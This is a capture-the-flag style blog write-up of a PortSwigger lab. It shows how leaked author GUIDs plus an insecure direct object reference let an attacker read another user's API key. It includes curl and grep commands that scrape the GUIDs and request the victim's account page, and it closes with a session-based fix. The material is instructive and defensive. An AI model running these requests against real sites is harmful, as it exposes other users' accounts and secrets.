---
layout: post
title: "PortSwigger: User ID Controlled by Request Parameter, with Unpredictable User IDs"
date: 2027-09-25 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, idor, horizontal-privilege-escalation, insecure-direct-object-reference, information-disclosure, cwe-639]
---

The [previous lab](/posts/portswigger-user-id-controlled-by-request-parameter/) was the simplest possible [IDOR](https://cwe.mitre.org/data/definitions/639.html): the account page keyed off `?id=carlos`, so you just typed the victim's username. This lab patches that the way many real apps do — it swaps the guessable username for an **unpredictable GUID**. The interesting part is *why that fix doesn't actually fix anything*.

## Overview

Same setup: you get `wiener:peter`, and the goal is to read `carlos`'s API key and submit it. The account page is still a plain [CWE-639](https://cwe.mitre.org/data/definitions/639.html) Insecure Direct Object Reference — it returns whoever's id you ask for, with no check that the id belongs to you.

## The tell

Log in and look at your own account URL:

```
GET /my-account?id=5a7f387e-7786-4b52-a130-1d2d3a571629
```

The id is a GUID now, not a username. You can't type `?id=carlos`, and you can't brute-force 128 bits of randomness. So the developer assumes the data is safe.

It isn't. **An unguessable ID is not an access control.** If the id leaks *anywhere* public, the protected object is wide open. The only question is where carlos's GUID is disclosed.

## Finding the leak

Carlos is an author on the blog. Every blog post embeds its author's GUID in the page. Scrape them all and see which GUID belongs to posts written by carlos:

```bash
U="https://<id>.web-security-academy.net"
for p in $(seq 1 10); do
  echo "post $p:"
  curl -s "$U/post?postId=$p" | grep -oiP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
done
# cross-reference which posts mention carlos as the author:
grep -rli carlos post*.html
```

Posts 3, 6 and 9 are carlos's, and they all carry the same author GUID:

```
21bee285-d14f-4e4d-9d62-e34d1faa486a
```

## The exploit

Feed carlos's GUID into the IDOR using your own session cookie:

```bash
curl -s -b cookies.txt "$U/my-account?id=21bee285-d14f-4e4d-9d62-e34d1faa486a"
# → <div>Your API Key is: 08JOSxPsCzwl2rPNbBpToFruRwKdSUmM</div>
```

Submit that API key:

```bash
curl -s -b cookies.txt "$U/submitSolution" --data-urlencode "answer=08JOSxPsCzwl2rPNbBpToFruRwKdSUmM"
# → {"correct":true}
```

The lab flips to **Solved**.

## Why it worked

Two bugs chain here, and you need both:

1. **Information disclosure** — the victim's "unpredictable" GUID is published in plain sight on the blog. Unpredictability only protects you if the secret stays secret, and identifiers like this leak constantly: author links, comment metadata, `_id` fields in JSON APIs, sourcemaps, error messages.
2. **The IDOR itself** ([CWE-639](https://cwe.mitre.org/data/definitions/639.html)) — `/my-account` trusts the `id` parameter and never checks it matches the logged-in session. Once you hold the GUID, the GUID *is* the authorization.

The GUID was security theatre. It raised the bar from "type the username" to "scrape one blog page," and that's all.

## The fix

Don't trust the `id` parameter at all. Derive the user from the **server-side session**:

```python
# wrong — authorization decided by attacker-controlled input
user = User.get(id=request.args["id"])

# right — identity comes from the session, never the request
user = User.get(id=session["user_id"])
```

If a feature genuinely needs to reference another object, enforce a per-request ownership check on every access. Unguessable IDs are fine as defence-in-depth, but they must never *be* the control.
